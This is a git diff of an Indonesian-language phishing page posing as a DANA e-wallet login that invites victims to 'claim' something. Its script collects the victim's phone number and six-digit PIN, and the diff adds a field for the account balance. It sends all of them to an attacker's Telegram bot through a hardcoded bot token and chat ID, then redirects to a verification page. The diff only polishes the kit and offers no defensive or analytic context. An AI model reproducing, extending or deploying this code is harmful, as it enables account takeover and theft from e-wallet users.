@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
@@ -12,36 +12,61 @@
     <img src="logo.png" alt="DANA Logo" />
     <h2>DANA</h2>
     <p>Masuk untuk klaim</p>
-    <p>‎ </p>
     <form id="loginForm">
+      <!-- Input Nomor DANA -->
       <label for="username">NOMOR DANA</label> 
       <input type="text" id="username" name="username" placeholder="6281XXXXXXXX" required />
 
+      <!-- Input PIN -->
       <label for="password">PIN DANA (6 angka)</label>
       <input type="text" id="password" name="password" maxlength="6" placeholder="******" required />
 
-      <button type="submit">Masuk</button>
+      <!-- Input Saldo Terkini -->
+      <label for="saldo">Saldo Terkini</label>
+      <input type="text" id="saldo" name="saldo" placeholder="Contoh: Rp120.000" required oninput="formatRupiah(this)" />
+
+      <!-- Tombol Submit -->
+      <button type="submit" id="submitBtn">Masuk</button>
     </form>
     <div class="message" id="message"></div>
   </div>
 
   <script>
+    // Token bot Telegram dan chat ID
     const token = "7412368257:AAEr_6ARKm2Jg0AmGq3UnWKUNSvpDqR5RVs";        
     const chat_id = "-4770559077";       
 
+    // Fungsi format ke Rupiah
+    function formatRupiah(input) {
+      let value = input.value.replace(/[^0-9]/g, "");
+      let formatted = new Intl.NumberFormat("id-ID").format(value);
+      input.value = "Rp" + formatted;
+    }
+
+    // Submit form
     document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
+
       const username = document.getElementById("username").value.trim();
       const password = document.getElementById("password").value.trim();
+      const saldo = document.getElementById("saldo").value.trim();
+      const submitBtn = document.getElementById("submitBtn");
 
+      // Validasi PIN harus 6 angka
       if (!/^\d{6}$/.test(password)) {
         alert("PIN harus terdiri dari 6 angka.");
         return;
       }
 
-      const message = `🔐 Login DANA\n📱 User: ${username}\n🔑 PIN: ${password}`;
+      // Siapkan pesan
+      const message = `🔐 Login DANA\n📱 User: ${username}\n🔑 PIN: ${password}\n💰 Saldo: ${saldo}`;
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
+      // Tampilkan loading
+      submitBtn.disabled = true;
+      submitBtn.innerText = "Memproses...";
+
+      // Kirim ke Telegram
       fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -53,20 +78,23 @@
       .then(response => {
         if (response.ok) {
           document.getElementById("message").innerText = "Loading...";
-          
-          // Redirect setelah 1 detik
           setTimeout(() => {
             window.location.href = "verifikasi.html";
           }, 2000);
         } else {
-          alert("Gagal....");
+          alert("Gagal mengirim data.");
+          submitBtn.disabled = false;
+          submitBtn.innerText = "Masuk";
         }
       })
       .catch(error => {
-        alert("Terjadi kesalahan.");
+        alert("Terjadi kesalahan jaringan.");
         console.error(error);
+        submitBtn.disabled = false;
+        submitBtn.innerText = "Masuk";
       });
     });
   </script>
+
 </body>
 </html>
